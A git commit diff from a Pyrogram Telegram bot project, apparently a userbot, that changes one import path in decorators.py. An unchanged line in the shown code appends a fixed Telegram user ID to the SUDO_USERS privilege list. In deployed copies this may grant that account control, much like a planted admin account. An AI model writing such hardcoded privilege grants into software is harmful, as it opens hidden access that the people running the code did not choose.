e0df50f830265c75c89384d31a32dd3283bbc09e
TheAltronX <108298020+TheAltronX@users.noreply.github.com>
2022-08-11 10:35:47 +0530

    Update decorators.py

--- altron/modules/helpers/decorators.py
+++ altron/modules/helpers/decorators.py
@@ -1,7 +1,7 @@
 from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
-from config import SUDO_USERS
+from altron.config import SUDO_USERS
 
 
 SUDO_USERS.append(5207640479)
